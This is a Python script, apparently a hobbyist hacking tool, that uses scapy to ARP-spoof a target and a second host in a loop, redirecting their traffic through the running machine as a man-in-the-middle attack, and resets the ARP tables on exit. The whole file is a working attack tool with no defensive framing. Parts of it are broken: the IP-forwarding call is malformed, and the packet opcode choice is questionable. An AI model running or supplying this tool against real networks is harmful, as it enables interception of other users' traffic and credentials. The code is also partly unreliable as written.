import scapy.all as scapy
import time
import sys
import argparse
import subprocess

def forward_packet_flow():
    subprocess.call("echo", 1 > "/proc/sys/net/ipv4/ip_forward")

def arg_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",help= "Target ip/" )
    parser.add_argument("-s", "--spoof",dest="spoof",help= "spoof ip")

    options = parser.parse_args()
    if not options.target:
        parser.error("[-]Enter a target ip")
    elif not options.spoof:
        parser.error("[-]Enter a spoof ip")
    return options

def get_mac(ip):
    arp_reques = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_request = broadcast/arp_reques
    answered = scapy.srp(broadcast_arp_request,timeout=1,verbose=False)[0]

    return answered[0][1].hwsrc

def arp_spoof(target_ip,spoof_ip):
    mac = get_mac(target_ip)
    packet = scapy.ARP(op=1, pdst = target_ip, hwdst = mac, psrc = spoof_ip )
    scapy.send(packet,verbose=False)

def restore(dest_ip,src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=1, pdst = dest_ip,hwdst = dest_mac,psrc = src_ip, hwsrc = src_mac )
    scapy.send(packet, verbose=False)

forward_packet_flow()
option = arg_parse()
target_ip = option.target
spoof_ip = option.spoof

packet_count = 0
try:
    while True:
        arp_spoof(target_ip,spoof_ip)
        arp_spoof(spoof_ip,target_ip)
        packet_count = packet_count + 2
        print("\r[+] Packet sent = " + str(packet_count)),
        sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Quiting.....!Resetting ARP tables...!")
    restore(target_ip, spoof_ip)
    restore(spoof_ip, target_ip)


